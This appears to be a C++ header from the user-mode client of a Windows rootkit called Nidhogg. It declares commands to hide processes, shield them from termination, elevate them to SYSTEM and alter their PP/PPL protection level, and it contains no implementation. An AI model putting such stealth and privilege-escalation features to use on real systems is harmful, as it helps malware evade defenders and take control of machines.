#pragma once
#include "pch.h"
#include "CommandHandler.h"

class ProcessHandler : public CommandHandler {
private:
	bool Protect(_In_ DWORD pid, _In_ bool protect);
	bool Hide(_In_ DWORD pid, _In_ bool hide);
	bool Elevate(_In_ DWORD pid);
	bool SetProtection(_In_ DWORD pid, _In_ UCHAR signerType, _In_ UCHAR signatureSigner);
	std::vector<DWORD> ListHiddenProcesses();
	std::vector<DWORD> ListProtectedProcesses();
	bool ClearProtectedProcesses();
	bool ClearHiddenProcesses();
	bool ClearAll();
	bool CheckInput(_In_ const std::vector<std::string>& params);

public:
	ProcessHandler(_In_ std::shared_ptr<HANDLE> hNidhogg) : CommandHandler("Process", hNidhogg) {};

	void PrintHelp() override {
		std::cout << termcolor::bright_magenta << termcolor::underline << "Options:" << termcolor::reset << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "exit - Exit the program" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "back - Go back to the main menu" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[add | protect] [pid] - Protecting a process from being killed" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[remove | unprotect] [pid] - Removing protection from a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[hide] [pid] - Hide a process" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "[unhide | restore] [pid] - Revealing a process after hiding it" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "elevate [pid] - Elevating a process to system" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "list [hidden | protected] - Listing the currently hidden or protected processes" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "set_protection [signer type] [signature signer] - Changing the signature level of a process (PP/PPL)" << std::endl;
		std::cout << termcolor::bright_magenta << "\t[*] " << termcolor::reset << "clear [all | hidden | protected] - Clear all hidden or protected processes" << std::endl;
	}

	void HandleCommand(_In_ std::string command) override;
};

